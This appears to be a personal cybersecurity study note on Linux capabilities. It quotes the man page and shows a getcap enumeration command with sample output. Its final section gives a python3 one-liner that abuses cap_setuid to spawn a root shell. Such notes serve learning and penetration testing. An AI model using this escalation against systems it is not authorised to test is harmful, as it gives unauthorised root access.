---
aliases:
  - SUID (Set User ID)
tags:
  - tech
  - cybsec
  - linux
  - privilege_escalation
  - privesc
  - capabilities
author: Mehdi N Tehrani
creat_date: 2023-12-17
category: Cyber Security
subcategory: Linux SUID
---

# man page
https://man7.org/linux/man-pages/man7/capabilities.7.html
Description:
For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes:
privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero).  Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID, and supplementary group list).

Starting with Linux 2.2, Linux divides the privileges traditionally associated with superuser into distinct units,
known as capabilities, which can be independently enabled and disabled.  Capabilities are a per-thread attribute.

# find capabilities
```
$ getcap -r / 2>/dev/null
```

Example: 
output in kali
```
/usr/bin/ping cap_net_raw=ep
/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
/usr/bin/fping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
```

# Exploit
if the following capability is found on python
```
/usr/bin/python3 = cap_setuid+ep
```
then the following gives us root access:
```
$ /usr/bin/python3 -c 'import os; os.setuid(0);  os.system("/bin/bash")'
# whoami
root
```
